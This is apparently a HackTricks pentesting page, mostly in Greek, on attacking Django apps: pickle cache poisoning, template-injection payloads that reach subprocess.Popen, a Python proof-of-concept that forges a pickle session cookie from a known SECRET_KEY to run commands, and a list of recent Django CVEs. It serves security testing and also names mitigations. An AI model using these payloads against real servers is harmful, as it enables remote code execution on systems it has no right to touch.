# Django

{{#include ../../banners/hacktricks-training.md}}

## Cache Manipulation to RCE
Η προεπιλεγμένη μέθοδος αποθήκευσης της cache στο Django είναι τα [Python pickles](https://docs.python.org/3/library/pickle.html), τα οποία μπορούν να οδηγήσουν σε RCE αν [untrusted input is unpickled](https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf). **If an attacker can gain write access to the cache, they can escalate this vulnerability to RCE on the underlying server**.

Η cache του Django αποθηκεύεται σε ένα από τέσσερα σημεία: [Redis](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/redis.py#L12), [memory](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/locmem.py#L16), [files](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/filebased.py#L16), ή μια [database](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/db.py#L95). Η cache που είναι αποθηκευμένη σε Redis server ή σε database αποτελεί τα πιο πιθανά σημεία επίθεσης (Redis injection και SQL injection), αλλά ένας attacker μπορεί επίσης να χρησιμοποιήσει file-based cache για να μετατρέψει ένα arbitrary write σε RCE. Οι maintainers έχουν χαρακτηρίσει αυτό ως non-issue. Είναι σημαντικό να σημειωθεί ότι ο φάκελος των cache files, το όνομα του SQL table, και οι λεπτομέρειες του Redis server θα διαφέρουν ανάλογα με την υλοποίηση.

This HackerOne report provides a great, reproducible example of exploiting Django cache stored in a SQLite database: https://hackerone.com/reports/1415436

---

## Server-Side Template Injection (SSTI)
The Django Template Language (DTL) is **Turing-complete**. If user-supplied data is rendered as a *template string* (for example by calling `Template(user_input).render()` or when `|safe`/`format_html()` removes auto-escaping), an attacker may achieve full SSTI → RCE.

### Detection
1. Look for dynamic calls to `Template()` / `Engine.from_string()` / `render_to_string()` that include *any* unsanitised request data.
2. Send a time-based or arithmetic payload:
```django
{{7*7}}
```
If the rendered output contains `49` the input is compiled by the template engine.

### Primitive to RCE
Django blocks direct access to `__import__`, but the Python object graph is reachable:
```django
{{''.__class__.mro()[1].__subclasses__()}}
```
Βρείτε το index του `subprocess.Popen` (≈400–500 ανάλογα με το build του Python) και εκτελέστε αυθαίρετες εντολές:
```django
{{''.__class__.mro()[1].__subclasses__()[438]('id',shell=True,stdout=-1).communicate()[0]}}
```
Ένα πιο ασφαλές καθολικό gadget είναι να επαναλαμβάνετε μέχρι `cls.__name__ == 'Popen'`.

Το ίδιο gadget λειτουργεί για τις δυνατότητες template rendering του **Debug Toolbar** ή του **Django-CMS** που χειρίζονται εσφαλμένα την είσοδο χρήστη.

---

### Δείτε επίσης: ReportLab/xhtml2pdf PDF export RCE
Εφαρμογές που βασίζονται σε Django συχνά ενσωματώνουν xhtml2pdf/ReportLab για να εξάγουν views ως PDF. Όταν HTML υπό έλεγχο χρήστη περνάει στη δημιουργία PDF, rl_safe_eval μπορεί να αξιολογήσει εκφράσεις μέσα σε τριπλές αγκύλες `[[[ ... ]]]`, επιτρέποντας εκτέλεση κώδικα (CVE-2023-33733). Λεπτομέρειες, payloads και mitigations:

{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.md
{{#endref}}

---

## RCE σε Session Cookie με Pickle
Αν η ρύθμιση `SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'` είναι ενεργοποιημένη (ή υπάρχει custom serializer που απο-σειριοποιεί pickle), το Django *αποκρυπτογραφεί και unpickles* το session cookie **πριν** καλέσει οποιονδήποτε κώδικα view. Επομένως, η κατοχή ενός έγκυρου signing key (το project `SECRET_KEY` εξ ορισμού) είναι αρκετή για άμεση απομακρυσμένη εκτέλεση κώδικα.

### Απαιτήσεις Exploit
* Ο server χρησιμοποιεί `PickleSerializer`.
* Ο επιτιθέμενος γνωρίζει / μπορεί να μαντέψει το `settings.SECRET_KEY` (leaks via GitHub, `.env`, σελίδες σφαλμάτων, κ.λπ.).

### Proof-of-Concept
```python
#!/usr/bin/env python3
from django.contrib.sessions.serializers import PickleSerializer
from django.core import signing
import os, base64

class RCE(object):
def __reduce__(self):
return (os.system, ("id > /tmp/pwned",))

mal = signing.dumps(RCE(), key=b'SECRET_KEY_HERE', serializer=PickleSerializer)
print(f"sessionid={mal}")
```
Στείλτε το προκύπτον cookie — το payload θα εκτελεστεί με τα δικαιώματα του WSGI worker.

**Μέτρα μετριασμού**: Κρατήστε τον προεπιλεγμένο `JSONSerializer`, ανανεώστε το `SECRET_KEY`, και ρυθμίστε το `SESSION_COOKIE_HTTPONLY`.

---

## Πρόσφατες (2023-2025) CVE υψηλής σημασίας του Django που πρέπει να ελέγξουν οι Pentesters
* **CVE-2025-48432** – *Log Injection via unescaped `request.path`* (διορθώθηκε 4 Ιουνίου 2025). Επιτρέπει σε επιτιθέμενους να εισάγουν newlines/ANSI codes σε αρχεία καταγραφής και να μολύνουν τις επόμενες αναλύσεις καταγραφών. Patch level ≥ 4.2.22 / 5.1.10 / 5.2.2.
* **CVE-2024-42005** – *Critical SQL injection* in `QuerySet.values()/values_list()` on `JSONField` (CVSS 9.8). Δημιουργήστε κλειδιά JSON που παραβιάζουν τα εισαγωγικά και εκτελούν αυθαίρετο SQL. Διορθώθηκε στις εκδόσεις 4.2.15 / 5.0.8.

Πάντα κάντε fingerprint την ακριβή έκδοση του framework μέσω της σελίδας σφάλματος `X-Frame-Options` ή του hash του `/static/admin/css/base.css` και δοκιμάστε τα παραπάνω όπου εφαρμόζεται.

---

## Αναφορές
* Έκδοση ασφάλειας Django – "Django 5.2.2, 5.1.10, 4.2.22 address CVE-2025-48432" – 4 Ιουνίου 2025.
* OP-Innovate: "Django releases security updates to address SQL injection flaw CVE-2024-42005" – 11 Αυγούστου 2024.
* 0xdf: University (HTB) – Exploiting xhtml2pdf/ReportLab CVE-2023-33733 to gain RCE and pivot into AD – [https://0xdf.gitlab.io/2025/08/09/htb-university.html](https://0xdf.gitlab.io/2025/08/09/htb-university.html)

{{#include ../../banners/hacktricks-training.md}}
